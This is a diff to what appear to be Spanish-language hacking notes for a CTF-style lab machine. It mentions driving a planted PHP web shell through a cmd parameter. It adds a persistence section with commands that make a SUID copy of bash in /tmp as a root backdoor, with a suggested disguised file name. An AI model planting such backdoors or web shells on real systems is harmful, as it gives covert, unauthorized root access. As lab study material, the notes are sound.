@@ -301,7 +301,12 @@ Si viene escrito shell en algun lado es que ha funcionado.
 Al ver que funciona ya metes la shell de PHP ( ver PHP SHELL)
 Si por ejemplo has introducido el codigo php en una pagina que se llama index.php, buscas ---> dev.devvortex.htb/index.php?cmd=id
 te lo llevas al burpsuite y ya hay desde el repeater vas buscando con ls, etc
-
+```
+### PERSISTENCE 
+```
+Ejecutandolo como root, por ejemplo hackeas un sistema muy dificil y para no tener que hacerlo de nuevo haces como una backdoor que cuando ejecutes con -p /tmp/bash te vuelve a dar root ( puedes llamarlo /tmp/ejerciciosmañaneros)
+1) cp /bin/bash /tmp/bash; chmod +s /tmp/bash  ---> copia el programa de bash en /tmp/bash y le da privilegios
+2) /tmp/bash -p   ----> aplica esos permisos y te da root
 ```
 ### IMPACKET
 ```
